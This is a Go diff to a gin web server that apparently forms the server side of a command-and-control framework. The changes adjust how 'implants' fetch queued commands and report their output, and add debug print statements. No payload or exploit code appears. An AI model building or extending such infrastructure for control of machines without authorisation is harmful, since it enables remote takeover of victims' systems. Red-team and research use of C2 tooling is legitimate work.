@@ -4,6 +4,7 @@ import (
 	"awesomeProject/config"
 	"awesomeProject/database"
 	"awesomeProject/models"
+	"fmt"
 	"github.com/gin-gonic/gin"
 	"net/http"
 	"time"
@@ -80,21 +81,22 @@ func SendCommand(c *gin.Context) {
 }
 
 func GetCommandsForImplant(c *gin.Context) {
-	// Extract the implant ID from the request (e.g., via query parameter or header)
-	implantID := c.Query("implant_id")
+	// Extract the implant ID from the path parameter
+	implantID := c.Param("implant_id")
+	fmt.Println(implantID)
 	if implantID == "" {
 		c.JSON(http.StatusBadRequest, gin.H{"error": "Implant ID is required"})
 		return
 	}
 
-	// Fetch pending commands for the implant
-	commands, err := database.GetPendingCommandsForImplant(implantID)
+	// Fetch all commands for the implant
+	commands, err := database.GetCommandsByImplantID(implantID)
 	if err != nil {
 		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to fetch commands"})
 		return
 	}
 
-	// Return the commands to the implant
+	// Return the commands to the client
 	c.JSON(http.StatusOK, gin.H{
 		"commands": commands,
 	})
@@ -107,7 +109,7 @@ func HandleCommandResult(c *gin.Context) {
 		CommandID int    `json:"command_id"`
 		Output    string `json:"output"`
 	}
-
+	fmt.Println(request)
 	if err := c.ShouldBindJSON(&request); err != nil {
 		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request payload"})
 		return
@@ -125,7 +127,8 @@ func HandleCommandResult(c *gin.Context) {
 		c.JSON(http.StatusBadRequest, gin.H{"error": "Command already executed"})
 		return
 	}
-
+	fmt.Println(request.CommandID)
+	fmt.Println(request.Output)
 	// Mark the command as executed and store the output
 	err = database.MarkCommandAsExecuted(request.CommandID, request.Output)
 	if err != nil {
